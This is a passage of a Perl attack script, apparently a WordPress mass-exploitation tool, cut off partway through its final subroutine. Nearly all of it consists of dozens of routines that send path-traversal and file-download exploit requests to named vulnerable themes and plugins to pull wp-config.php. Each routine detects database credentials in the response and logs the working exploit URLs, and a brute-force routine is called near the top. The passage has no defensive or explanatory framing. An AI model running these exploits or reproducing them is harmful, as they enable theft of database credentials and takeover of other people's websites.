print color 'reset';
        open (TEXT, '>>Result/config.txt');
        print TEXT "\n[-]Database Host = $1";
        close (TEXT)
        }

wpbrute();
getcpconfig();
}}else{
    print color('bold red');
   print "[Failed]\n";
    print color('reset');

getcpconfig();

}
}

####################################################################################################

sub com_1(){              print color('bold white'),"[Acento] ............................. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################

	
	
	
sub com_2(){              print color('bold white'),"[ajax-store-locator-wordpress_0] ..... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
	
sub com_3(){              print color('bold white'),"[Antioch] ............................ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
	
	sub com_4(){              print color('bold white'),"[Authentic] .......................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
	
	sub com_5(){             print color('bold white'),"[Churchope] .......................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
	
	
	
	sub com_6(){             print color('bold white'),"[Epic] ............................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/epic/includes/download.php?file=wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
####################################################################################################
	
	
	
	
	
	
	
	
	
sub com_7(){              print color('bold white'),"[Felis] .............................. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/felis/download.php?file=../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
####################################################################################################
	

	
	
	
	
	
	
	sub com_8(){             print color('bold white'),"[Force-Download] ..................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/force-download.php?file=../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
####################################################################################################
	
	
	
	
	

	
	
sub com_9(){              print color('bold white'),"[FR0_theme] .......................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/FR0_theme/down.php?path=$site/wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	
sub com_10(){             print color('bold white'),"[hb-audio-gallery-lite] .............. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	sub com_11(){             print color('bold white'),"[History-collection] ................. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	sub com_12(){             print color('bold white'),"[Image-export] ....................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/image-export/download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	####################################################################################################

	
	
	
	
	
	sub com_13(){              print color('bold white'),"[kbslider_show_image] ................ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-admin/admin-ajax.php?action=kbslider_show_image&img=../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
	####################################################################################################

	
	
	sub com_14(){              print color('bold white'),"[Linenity] ........................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
####################################################################################################
	
	
	sub com_15(){              print color('bold white'),"[Lote27] ............................. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/lote27/download.php?download=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
####################################################################################################
	
	
	
	
	
sub com_16(){              print color('bold white'),"[Markant] ............................ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/markant/download.php?file=../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	sub com_17(){             print color('bold white'),"[MichaelCanthony] .................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
####################################################################################################
	
	
	sub com_18(){             print color('bold white'),"[mTheme-Unus] ........................ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	sub com_19(){             print color('bold white'),"[NativeChurch] ....................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	####################################################################################################

	sub com_20(){              print color('bold white'),"[Parallelus-Salutation] .............. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=..%2F..%2F..%2F..%2F..%2F..%2Fwp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	####################################################################################################

	
	
	sub com_21(){             print color('bold white'),"[RedSteel] ........................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/RedSteel/download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	####################################################################################################

	
	
	sub com_22(){              print color('bold white'),"[Revslider] .......................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	####################################################################################################

	
	sub com_23(){              print color('bold white'),"[S3bubble-amazon-s3-html-5] .......... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?name=wp-config.php&path=../../../../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	sub com_24(){              print color('bold white'),"[SMWF] ............................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	sub com_25(){             print color('bold white'),"[TheLoft] ............................ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	sub com_26(){             print color('bold white'),"[Trinity] ............................ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
	
####################################################################################################
	
	sub com_27(){              print color('bold white'),"[Urbancity] .......................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	
	sub com_28(){              print color('bold white'),"[Yakimabait] ......................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/yakimabait/download.php?file=./wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	####################################################################################################

	
	
	sub com_29(){            print color('bold white'),"[Membership Simplified v1.58] ........ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
		sub com_30(){              print color('bold white'),"[Wp-FileManager] ..................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/wp-filemanager/incl/libfile.php?&path=../../&filename=wp-config.php&action=download";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
			sub com_31(){              print color('bold white'),"[Google-mp3-audio-player] ............ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
				sub com_32(){             print color('bold white'),"[Justified-image-grid 1] ............. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/wamp/www/wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
				sub com_33(){            print color('bold white'),"[Justified-image-grid 2] ............. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/xampp/htdocs/wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
				sub com_34(){             print color('bold white'),"[Justified-image-grid 3] ............. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	
				sub com_35(){             print color('bold white'),"[Aspose-cloud-ebook-generator] ....... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	

	####################################################################################################

	
	
					sub com_36(){             print color('bold white'),"[Aspose-doc-exporter] ................ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
						sub com_37(){              print color('bold white'),"[MiwoFTP 1.0.5  1] ................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&item=wp-config.php&order=name&srt=yes";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
						sub com_38(){           print color('bold white'),"[MiwoFTP 1.0.5  2] ................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	####################################################################################################

	
	
							sub com_39(){           print color('bold white'),"[Wp-miniaudioplayer] ................. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
								sub com_40(){              print color('bold white'),"[Ypo-theme] .......................... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/ypo-theme/download.php?download=..%2F..%2F..%2F..%2Fwp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "[Success] ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Wp-Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "[Failed]";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	
	
									sub com_41(){            print color('bold white'),"[N-Media 1.4] ........................ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/website-contact-form-with-file-upload/config.php";
